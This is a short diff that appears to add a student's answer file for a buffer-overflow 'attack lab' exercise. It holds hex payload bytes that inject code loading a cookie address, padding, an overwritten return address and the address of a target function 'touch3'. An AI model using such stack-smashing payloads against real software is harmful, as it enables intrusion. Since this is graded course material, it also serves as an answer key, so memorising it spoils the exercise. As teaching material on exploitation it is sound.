@@ -1,0 +1,10 @@
+/* 0x55675278 rsp address from Phase 2 */
+/* 0x556752A0 rsp + 0x28 */
+
+48 c7 c7 a0 52 67 55 c3 /* rsp + 28 the address where the cookie is present */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00
+78 52 67 55 00 00 00 00 /* 0x 55 67 52 78 rsp address */
+dc 19 40 00 00 00 00 00 /* 0x4019dc address of touch3 */
+36 36 34 32 65 36 36 34 /* cookie string */
